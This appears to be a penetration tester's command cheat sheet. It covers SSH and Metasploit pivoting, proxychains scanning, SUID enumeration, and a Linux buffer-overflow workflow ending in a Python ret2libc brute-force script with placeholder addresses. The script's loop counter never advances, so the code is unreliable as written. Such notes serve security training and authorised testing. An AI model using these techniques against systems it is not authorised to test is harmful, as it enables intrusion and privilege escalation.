# Useful Commands

## SSH
- Proxy traffic through SSH tunnel: `ssh -D localhost:8000 user@ip`
- Proxy traffic through multiple tunnels:
```bash
ssh -L 9999:localhost:9999 user@<ip>
ssh -D localhost:9999 <ip> -p 25
```
- Proxy traffic through Metasploit: `ssh -L 8000:<remoteIP>:1337 root@<remoteIP>`, then start socks via Metasploit on port `1337`.

## 
- Parse `access.log` file for unique IP addresses: `cat access.log | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | sort -u `

## Starting a SOCKS server via Metasploit
- Add a route to go through a current session
- `use auxiliary/server/socks4a`
- `set srvport <port>`
- `run -j`

## Scanning through Proxychains
- `proxychains nmap -sT -Pn <ip>`

## Linux Enumeration
- `find / -perm -4000 2>/dev/null` - Find files with SUID bit set

## Linux Buffer Overflow

### Creating Unique Patterns
- `msf-pattern_create -l <length>`
- `msf-pattern_offset -q <location>`

### gdb-peda
- `checksec` - checks memory protections enabled on binary
- `b main` - sets a breakpoint at main
- `r <arguments>` - runs the binary with the arguments specified
- `p system` - gets memory address of system
- `p exit` - gets exit address

### Easy check for ASLR
- `ldd <binary> | grep libc` - Run multiple times to see if memory address changes

### Disable ASLR
- As root: `echo 0 > /proc/sys/kernel/randomize_va_space`

### Enable ASLR
- As root: `echo 2 > /proc/sys/kernel/randomize_va_space`

### Identify system offset 
- `readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system`

### Identify exit offset
- `readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit`

### Identify /bin/sh location
- `strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh`

### Brute Force ASLR Example

```python
from subprocess import call
import struct

libc_base_addr = <address>

system_off = <address>
exit_off = <address>
arg_off = <address>

system_addr = struct.pack("<I",libc_base_addr+system_off)
exit_addr = struct.pack("<I",libc_base_addr+exit_off)
arg_addr = struct.pack("<I",libc_base_addr+arg_off)

bof = "A" * 112
bof += system_addr
bof += exit_addr
bof += arg_addr

i = 0
while (i <512):
  print "Try: %s" %i
  i += i
  ret = call(["/path/to/binary", bof])
```
